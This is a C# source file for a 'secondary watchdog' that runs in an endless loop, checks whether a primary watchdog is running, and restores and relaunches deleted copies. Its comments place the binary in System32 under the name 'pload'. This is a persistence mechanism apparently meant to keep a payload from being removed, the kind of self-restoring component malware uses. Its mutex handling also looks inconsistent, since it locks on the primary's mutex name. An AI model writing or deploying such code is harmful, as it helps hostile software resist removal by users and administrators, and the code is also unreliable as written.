using System.Diagnostics;
using watchdogHelper;

//THIS FILE IS TO BE COMPILED SEPERATELY IN DEPLOYMENT
/*

This secondary watchdog monitors the main watchdog. It verifies if it running. 
\
If not running, it verifies the existence of the file then runs it.

if doesnt exist, it takes from another copy of the watchdog, copies it to the orig location, then runs it
if the secondary location of the primary watchdog gets removed, the secondary watchdog copies it back again


*/
namespace MonitorWatchdog
{
    public class MonitorWatchdog
    {
        // Defaults to putting the file in the System32 directory and the binary name pload
        public static string? BinaryPath { get; private set; }
        public static string? BinaryName { get; private set; }
        public static string? PrimaryWatchdogMutexName { get; private set; }
        public static string? SecondaryWatchdogPath { get; private set; }
        public static string? SecondaryWatchdogName { get; private set; }
        public static string? PrimaryWatchdogPath { get; private set; }
        public static string? PrimaryWatchdogName { get; private set; }
        public static string? SecondaryWatchdogMutexName { get; private set; }
        static void Main(string[] args)
        {
            string[] staticVars = { "BinaryPath", "BinaryName", "SecondaryWatchdogPath", "SecondaryWatchdogName", "SecondaryWatchdogMutexName", "PrimaryWatchdogMutexName", "PrimaryWatchdogPath", "PrimaryWatchdogName" };
            watchdogHelper.watchdogHelper.LoadFromJson("Config.json", staticVars);

            // Create or open the mutex to ensure only one instance is running
            using (Mutex mutex = new Mutex(false, PrimaryWatchdogMutexName, out bool isNewInstance))
            {
                if (!isNewInstance)
                {
                    //Watchdog process is already running. Exiting.
                    return;
                }


                WatchdogLogic();
            }
        }


        static void WatchdogLogic()
        { 
    //  loop for frequent checks
            while (true)
            {
                if (watchdogHelper.watchdogHelper.IsMutexRunning(PrimaryWatchdogMutexName))
                {
                    watchdogHelper.watchdogHelper.CheckBinary(PrimaryWatchdogPath, PrimaryWatchdogName);
                }

                Thread.Sleep(10000); 
            }
        }

        }
}